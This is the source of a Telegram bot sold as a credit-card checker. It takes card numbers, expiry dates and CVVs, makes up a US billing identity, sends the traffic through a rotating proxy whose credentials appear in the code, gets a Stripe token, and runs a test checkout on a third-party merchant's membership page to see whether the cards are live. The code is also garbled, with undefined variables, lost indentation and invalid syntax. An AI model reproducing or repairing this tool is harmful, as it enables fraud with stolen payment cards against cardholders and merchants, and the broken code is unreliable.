import logging
import os
import requests
import time
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

ENV = bool(os.environ.get('ENV', True))
TOKEN = os.environ.get("TOKEN", None)
BLACKLISTED = os.environ.get("BLACKLISTED", None)
PREFIX = "!/"

# Configure logging
logging.basicConfig(level = logging.INFO)

# Initialize bot and dispatcher
bot = Bot(token = TOKEN, parse_mode = types.ParseMode.HTML)
dp = Dispatcher(bot)

###USE YOUR ROTATING PROXY### NEED HQ PROXIES ELSE WONT WORK UPDATE THIS FILED
proxy = random.choice('http://bqqqfxeo-rotate:071h9m2354ed@p.webshare.io:80/')
res = r.partition('\n')[0]
proxy = {
  "'http' : proxy, 'https' : proxy"
}
requests.session()
session.proxies = proxy


r = requests.get('https://randomuser.me/api/?nat=us&inc=name,location').text
random_data = (res.text)
first_name = random_data['results'][0]['name']['first']
last_name = random_data['results'][0]['name']['last']
street = (random_data['results'][0]['location']['street']['number'])
city = random_data['results'][0]['location']['city']
state = random_data['results'][0]['location']['state']
zip = random_data['results'][0]['location']['postcode']


@dp.message_handler(commands = ['start', 'help'], commands_prefix = PREFIX)
async def helpstr(message: types.Message):
await message.answer_chat_action("typing")
await message.reply(
  "Hello Welcome The King Mar Bot<code>cc Checker pro</code>\nREPO <a href='https://github.com/xbinner18/Mrbannker'>Here</a>"
)

@dp.message_handler(commands = ["bin"], commands_prefix = PREFIX)
async def binio(message: types.Message):
await message.answer_chat_action("typing")
BIN = message.text[len("/bin "): 11]
if len(BIN) < 6:
return await message.reply("Send bin not ass")
if not BIN:
return await message.reply("Did u Really Know how to use me.")
r = requests.get(f"https://bins.ws/search?bins= {
  BIN
}&bank=&country=").text
soup = BeautifulSoup(r, features = "html.parser")
k = soup.find("div", {
  "class": "page"
})
INFO = f"""
═════════╕
<b>BIN INFO</b>
<code> {
  k.get_text()[62:]}</code>
CheckedBy: <a href="tg://user?id= {
  message.from_user.id
}"> {
  message.from_user.first_name
}</a>
<b>Bot:</b> @Kingmarbot
╘═════════
"""
await message.reply(INFO)


@dp.message_handler(commands = ['chk'], commands_prefix = PREFIX)
async def ch(message: types.Message):
tic = time.perf_counter()
await message.answer_chat_action("typing")
cc = message.text[len('/chk '):]
splitter = cc.split('|')
ccn = splitter[0]
mm = splitter[1]
yy = splitter[2]
cvv = splitter[3]
email = f" {
  str(rnd)}@gmail.com"
if not cc:
return await message.reply(
  "<code>Send Card /chk cc|mm|yy|cvv.</code>"
)
BIN = cc[:6]
if BIN in BLACKLISTED:
return await message.reply(
  "<b>BLACKLISTED BIN</b>"
)
# sk
sk_headers = {
  "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
  "referer": "https://js.stripe.com/",
  "origin": "https://js.stripe.com",
  "content-type": "application/x-www-form-urlencoded",
  "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
  "Accept": "application/json",
  "authority": "api.stripe.com",
}

headers = {
  "authority": "www.diamonddjs.co.uk",
  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
  "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
  "content-type": "application/x-www-form-urlencoded",
  "cookie": "PHPSESSID=0587198944f02bad9716a53df84c750a",
  "origin": "https://www.diamonddjs.co.uk",
  "referer": "https://www.diamonddjs.co.uk/membership-account/membership-checkout/",
  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
}

data = f"time_on_page=38212&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F308cc4f&card[number]= {
  cc
}&card[exp_month]= {
  mes
}&card[exp_year]= {
  ano
}&card[address_line1]= {
  street
}&card[address_line2]=&card[address_city]= {
  city
}&card[address_state]= {
  state
}&card[address_zip]= {
  zip
}&card[address_country]=US&card[cvc]= {
  cvv
}&card[name]= {
  first_name
}+ {
  last_name
}"


res = curl.post("https://api.stripe.com/v1/tokens",headers=sk_headers,data=data)l
  msg = res["error"]["message"]
  toc = time.perf_counter()
  json_first = json.loads(res.text)
  if "error" in json_first:
  text:
  await message.reply(f"""
✅<b>CC</b>➟ <code> {
    cc
  }</code>
<b>STATUS</b>➟ #REJECTED [INCORRECT CARD]
<b>MSG</b>➟ {
    msg
  }
<b>TOOK:</b> <code> {
    toc - tic:0.4f
  }</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id= {
    message.from_user.id
  }"> {
    message.from_user.first_name
  }</a>
    """)
  elif "id" not in json_first:
  text:
  await message.reply(f"""
✔️<b>CC</b>➟ <code> {
    cc
  }</code>
<b>STATUS</b>➟ #REJECTED [INCORRECT CARD]
<b>MSG</b>➟ {
    msg
  }
<b>TOOK:</b> <code> {
    toc - tic:0.4f
  }</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id= {
    message.from_user.id
  }"> {
    message.from_user.first_name
  }</a>
    """)
  else :
  id = json_first("id")
  data = f"level=1&checkjavascript=1&other_discount_code=&username= {
    get_username()}&first_name= {
    first_name
  }&last_name= {
    last_name
  }&dj_name= {
    first_name
  }&dj_city= {
    city
  }&password= {
    password
  }&password2= {
    password
  }&bemail= {
    email
  }&bconfirmemail_copy=1&fullname=&bfirstname= {
    first_name
  }&blastname= {
    last_name
  }&baddress1= {
    street
  }&baddress2=&bcity= {
    city
  }&bstate= {
    state
  }&bzipcode= {
    zip
  }&bcountry=US&bphone=%28225%29+368-7536&CardType=Visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&stripeToken0= {
    id
  }&AccountNumber= {
    cc
  }&ExpirationMonth= {
    mes
  }&ExpirationYear= {
    ano
  }"

  res = curl.post("https://www.diamonddjs.co.uk/membership-account/membership-checkout/",headers = headers,data = data)

  elif:
  await message.reply(f"""
✅<b>CC</b>➟ <code> {
    cc
  }</code>
<b>STATUS</b>➟ #ApprovedCCN
<b>MSG</b>➟ {
    msg
  }
<b>TOOK:</b> <code> {
    toc - tic:0.4f
  }</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id= {
    message.from_user.id
  }"> {
    message.from_user.first_name
  }</a>
    """)

  elif:
  await message.reply(f"""
✔️<b>CC</b>➟ <code> {
    cc
  }</code>
<b>STATUS</b>➟ #ApprovedCVV
<b>MSG</b>➟ {
    msg
  }
<b>TOOK:</b> <code> {
    toc - tic:0.4f
  }</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id= {
    message.from_user.id
  }"> {
    message.from_user.first_name
  }</a>
    """)

  else :
  await message.reply(f"""
❌<b>CC</b>➟ <code> {
    cc
  }</code>
<b>STATUS</b>➟ Declined
<b>MSG</b>➟ {
    msg
  }
<b>TOOK:</b> <code> {
    toc - tic:0.4f
  }</code>(s)
<b>CHKBY</b>➟ <a href="tg://user?id= {
    message.from_user.id
  }"> {
    message.from_user.first_name
  }</a>
    """)


  if __name__ == '__main__':
  executor.start_polling(dp, skip_updates = True)